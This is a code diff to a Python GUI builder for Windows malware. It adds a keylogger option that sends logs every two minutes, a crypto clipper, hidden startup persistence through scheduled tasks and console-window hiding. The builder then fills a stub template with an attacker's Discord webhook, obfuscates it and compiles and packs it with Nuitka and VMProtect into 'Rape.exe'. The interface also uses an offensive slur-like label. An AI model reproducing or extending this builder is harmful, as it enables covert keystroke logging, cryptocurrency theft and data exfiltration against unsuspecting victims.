@@ -9,6 +9,18 @@ import sys
 import subprocess
 import threading
 import time
+import ctypes
+from PIL import Image, ImageTk
+
+# Hide Console immediately
+if sys.platform == "win32":
+    try:
+        kernel32 = ctypes.WinDLL('kernel32')
+        user32 = ctypes.WinDLL('user32')
+        hwnd = kernel32.GetConsoleWindow()
+        if hwnd:
+           user32.ShowWindow(hwnd, 0)
+    except: pass
 
 def ensure_ctk():
     try:
@@ -53,7 +65,7 @@ class DependencyChecker(ctk.CTk):
         self.monitor_check()
 
     def check_dependencies(self):
-        modules = ["cryptography", "aiohttp", "nuitka", "pyperclip", "customtkinter", "pillow"]
+        modules = ["cryptography", "aiohttp", "nuitka", "pyperclip", "customtkinter", "pillow", "requests", "pynput"]
         
         for i, module in enumerate(modules):
             self.update_status_thread(f"Checking {module}...", (i / len(modules)))
@@ -116,6 +128,7 @@ class BuilderGUI(ctk.CTk):
         # New Features
         self.var_vmprotect = ctk.BooleanVar(value=False)
         self.var_crypto_clipper = ctk.BooleanVar(value=False)
+        self.var_keylogger = ctk.BooleanVar(value=False)
 
         self.create_widgets()
 
@@ -162,7 +175,7 @@ class BuilderGUI(ctk.CTk):
         self.check_fake_error = ctk.CTkCheckBox(col2, text="Enable Fake Error", variable=self.var_fake_error)
         self.check_fake_error.pack(pady=10, anchor="w", padx=20)
 
-        self.check_startup = ctk.CTkCheckBox(col2, text="Run at Startup (Hidden)", variable=self.var_startup)
+        self.check_startup = ctk.CTkCheckBox(col2, text="Run at Startup (Hidden)", variable=self.var_startup, command=self.toggle_startup)
         self.check_startup.pack(pady=10, anchor="w", padx=20)
         
         self.label_startup_warn = ctk.CTkLabel(col2, text="If this is selected, the application will request administrator permission.", text_color="orange", font=("Roboto", 10))
@@ -172,14 +185,24 @@ class BuilderGUI(ctk.CTk):
         self.check_vmprotect.pack(pady=10, anchor="w", padx=20)
 
         # Crypto Clipper Checkbox & Warning
-        self.frame_clipper_toggle = ctk.CTkFrame(self.frame_general, border_width=1, border_color="red")
+        self.frame_clipper_toggle = ctk.CTkFrame(self.frame_general, border_width=1, border_color="black")
         self.frame_clipper_toggle.pack(pady=15, padx=20, fill="x")
         
-        self.check_crypto = ctk.CTkCheckBox(self.frame_clipper_toggle, text="Enable Crypto Clipper", variable=self.var_crypto_clipper, command=self.toggle_crypto_tab, text_color="red")
+        self.check_crypto = ctk.CTkCheckBox(self.frame_clipper_toggle, text="Enable Crypto Clipper", variable=self.var_crypto_clipper, command=self.toggle_crypto_tab)
         self.check_crypto.pack(side="left", pady=10, padx=20)
         
-        self.label_warn = ctk.CTkLabel(self.frame_clipper_toggle, text="⚠ WARNING: Running constantly in background if enabled!", text_color="orange")
+        self.label_warn = ctk.CTkLabel(self.frame_clipper_toggle, text="Running constantly in background if enabled!", text_color="orange")
         self.label_warn.pack(side="left", pady=10, padx=10)
+
+        # Keylogger Checkbox
+        self.frame_keylogger = ctk.CTkFrame(self.frame_general, border_width=1, border_color="black")
+        self.frame_keylogger.pack(pady=5, padx=20, fill="x")
+
+        self.check_keylogger = ctk.CTkCheckBox(self.frame_keylogger, text="Enable Keylogger", variable=self.var_keylogger, command=self.toggle_keylogger)
+        self.check_keylogger.pack(side="left", pady=10, padx=20)
+
+        self.label_warn_key = ctk.CTkLabel(self.frame_keylogger, text="Running constantly in background if enabled!. Sends logs every 2 mins.", text_color="orange")
+        self.label_warn_key.pack(side="left", pady=10, padx=10)
 
         # Icon
         self.btn_icon = ctk.CTkButton(self.frame_general, text="Select Icon (.ico)", command=self.select_icon)
@@ -197,8 +220,51 @@ class BuilderGUI(ctk.CTk):
         self.label_status = ctk.CTkLabel(self.frame_build, text="Ready to Rape", text_color="green", font=("Roboto", 14))
         self.label_status.pack(pady=10)
 
+        # Loading GIF Label (Hidden initially)
+        self.label_loading = tk.Label(self.frame_build, bg="#2b2b2b", borderwidth=0) 
+        # Note: bg color hardcoded to match default ctk dark theme somewhat, or use transparent if possible. 
+        # Tkinter labels don't support transparent bg easily. 
+        
+        self.label_wait_text = ctk.CTkLabel(self.frame_build, text="( it may take a long time, please wait... )", font=("Roboto", 12), text_color="gray")
+        
+        self.loading_gif_frames = []
+        self.loading_gif_idx = 0
+        self.is_loading = False
+
+        self.load_gif_frames()
+
+    def load_gif_frames(self):
+        try:
+            if os.path.exists("loading.gif"):
+                img = Image.open("loading.gif")
+                try:
+                    while True:
+                        self.loading_gif_frames.append(ImageTk.PhotoImage(img.copy()))
+                        img.seek(len(self.loading_gif_frames))
+                except EOFError:
+                    pass
+        except: pass
+
+    def update_gif(self):
+        if self.is_loading and self.loading_gif_frames:
+             frame = self.loading_gif_frames[self.loading_gif_idx]
+             self.label_loading.configure(image=frame)
+             self.loading_gif_idx = (self.loading_gif_idx + 1) % len(self.loading_gif_frames)
+             self.after(50, self.update_gif)
+
+    def toggle_keylogger(self):
+        if self.var_keylogger.get():
+             self.var_startup.set(True)
+
+    def toggle_startup(self):
+        if not self.var_startup.get():
+             self.var_crypto_clipper.set(False)
+             self.var_keylogger.set(False)
+             self.toggle_crypto_tab()
+
     def toggle_crypto_tab(self):
         if self.var_crypto_clipper.get():
+            self.var_startup.set(True)
             try:
                 self.tabview.add("Crypto Clipper")
                 self.setup_crypto_tab()
@@ -244,31 +310,72 @@ class BuilderGUI(ctk.CTk):
             self.icon_path = file_path
 
     def build_stub(self):
-        self.label_status.configure(text="Building... Please Wait...", text_color="yellow")
-        self.update()
-
+        if self.is_loading: return # Prevent double click
+        
         webhook = self.entry_webhook.get()
         if not webhook.startswith("http"):
             messagebox.showerror("Error", "Invalid Webhook URL")
             self.label_status.configure(text="Error: Invalid Webhook", text_color="red")
             return
 
-        # Prepare Crypto Data
-        crypto_data = {}
-        if self.var_crypto_clipper.get():
-            for coin, entry in self.entries_crypto.items():
-                addr = entry.get().strip()
-                if addr:
-                    crypto_data[coin] = addr
+        # Start Thread
+        self.is_loading = True
+        self.btn_build.configure(state="disabled")
+        self.label_status.configure(text="Building... Please Wait...", text_color="yellow")
         
+        if self.loading_gif_frames:
+            self.label_loading.pack(pady=5)
+            self.update_gif()
+            
+        self.label_wait_text.pack(pady=5)
+        
+        threading.Thread(target=self._build_process_thread, args=(webhook,), daemon=True).start()
+
+    def _build_process_thread(self, webhook):
         try:
+            # Verify Webhook (New Method)
+            import requests
+            try:
+                # Test payload to check if it supports thread creation
+                payload = {
+                    "content": "Builder Verification - You can delete this.",
+                    "thread_name": "Verification-Check"
+                }
+                
+                r = requests.post(webhook, json=payload)
+
+                if r.status_code in (200, 204):
+                    self.update_status_safe("Verified! (Thread Capable)", "green")
+                elif r.status_code == 400:
+                    self.show_error_safe("This is a TEXT CHANNEL webhook.\nIt cannot create threads (returned 400).\nPlease use a FORUM CHANNEL webhook.")
+                    return
+                elif r.status_code == 401:
+                    self.show_error_safe("Webhook is invalid or deleted (401).")
+                    return
+                else:
+                    self.show_error_safe(f"Unknown Status: {r.status_code}\nResponse: {r.text}")
+                    return
+                     
+            except Exception as e:
+                self.show_error_safe(f"Could not connect to webhook: {e}")
+                return
+
+            # Prepare Crypto Data
+            crypto_data = {}
+            if self.var_crypto_clipper.get():
+                for coin, entry in self.entries_crypto.items():
+                    addr = entry.get().strip()
+                    if addr:
+                        crypto_data[coin] = addr
+            
             # 1. Read Rape.py template
+            self.update_status_safe("Reading Templates...", "blue")
             with open("Rape.py", "r", encoding="utf-8", errors="ignore") as f:
                 content = f.read()
 
             # 2. Startup Logic
             if self.var_startup.get():
-                startup_mod = "regedit" # Enforced strong persistence
+                startup_mod = "schtasks" # Enforced strong persistence (Scheduled Task)
             else:
                 startup_mod = "no-startup"
 
@@ -283,20 +390,19 @@ class BuilderGUI(ctk.CTk):
             # Crypto placeholders
             content = content.replace("'%CRYPTO_CONFIG%'", str(crypto_data))
             content = content.replace('"%CRYPTO_CLIPPER_ENABLED%"', str(self.var_crypto_clipper.get()))
+            content = content.replace('"%KEYLOGGER_ENABLED%"', str(self.var_keylogger.get()))
 
             with open("Stub.py", "w", encoding="utf-8") as f:
                 f.write(content)
 
             # 5. Obfuscate
-            self.label_status.configure(text="Obfuscating...", text_color="blue")
-            self.update()
+            self.update_status_safe("Obfuscating...", "blue")
             if os.path.exists("Obfuscator/obf.py"):
                  # Assuming obf.py logic remains same
                 os.system(f'python "Obfuscator/obf.py" "Stub.py" stub.py')
 
             # 6. Nuitka Compilation
-            self.label_status.configure(text="Compiling EXE with Nuitka...", text_color="blue")
-            self.update()
+            self.update_status_safe("Compiling EXE with Nuitka... (This takes time)", "blue")
             
             if os.path.exists("Rape.exe"):
                 try: os.remove("Rape.exe")
@@ -319,14 +425,15 @@ class BuilderGUI(ctk.CTk):
             cmd += ' -o Rape.exe'
             
             cmd += ' --include-module=pyperclip'
+            cmd += ' --include-module=pynput'
             cmd += ' stub.py'
             
-            os.system(cmd)
+            # Run command
+            subprocess.run(cmd, shell=True, check=True)
 
             # 6.5 VMProtect
             if self.var_vmprotect.get():
-                self.label_status.configure(text="Protecting with VMProtect...", text_color="purple")
-                self.update()
+                self.update_status_safe("Protecting with VMProtect...", "purple")
                 
                 vmp_path = os.path.abspath("VMprotect/VMProtect_Console.exe")
                 
@@ -343,9 +450,9 @@ class BuilderGUI(ctk.CTk):
                             os.rename("Rape_protected.exe", "Rape.exe")
                         except: pass
                     else:
-                         self.label_status.configure(text="VMProtect failed (no output)", text_color="red")
+                         self.update_status_safe("VMProtect failed (no output)", "red")
                 else:
-                     self.label_status.configure(text="VMProtect or Rape.exe not found", text_color="red")
+                     self.update_status_safe("VMProtect or Rape.exe not found", "red")
             
             # 7. Cleanup
             try:
@@ -356,12 +463,33 @@ class BuilderGUI(ctk.CTk):
                 if os.path.exists("Stub.py"): os.remove("Stub.py")
             except: pass
 
-            self.label_status.configure(text="Build Success! Saved as Rape.exe", text_color="green")
-            messagebox.showinfo("Success", "Build Complete! File saved as Rape.exe")
+            self.update_status_safe("Build Success! Saved as Rape.exe", "green")
+            self.show_info_safe("Success", "Build Complete! File saved as Rape.exe")
 
         except Exception as e:
-            self.label_status.configure(text=f"Error: {str(e)}", text_color="red")
-            messagebox.showerror("Build Error", str(e))
+            self.update_status_safe(f"Error: {str(e)}", "red")
+            self.show_error_safe(str(e))
+        finally:
+            self.finish_loading_safe()
+
+    def update_status_safe(self, text, color):
+        self.label_status.after(0, lambda: self.label_status.configure(text=text, text_color=color))
+
+    def show_error_safe(self, msg):
+        self.after(0, lambda: messagebox.showerror("Error", msg))
+        self.finish_loading_safe()
+
+    def show_info_safe(self, title, msg):
+        self.after(0, lambda: messagebox.showinfo(title, msg))
+
+    def finish_loading_safe(self):
+        self.after(0, self._finish_loading)
+
+    def _finish_loading(self):
+        self.is_loading = False
+        self.btn_build.configure(state="normal")
+        self.label_loading.pack_forget()
+        self.label_wait_text.pack_forget()
 
 if __name__ == "__main__":
     # 1. Run Dependency Checker (Blocking loop)
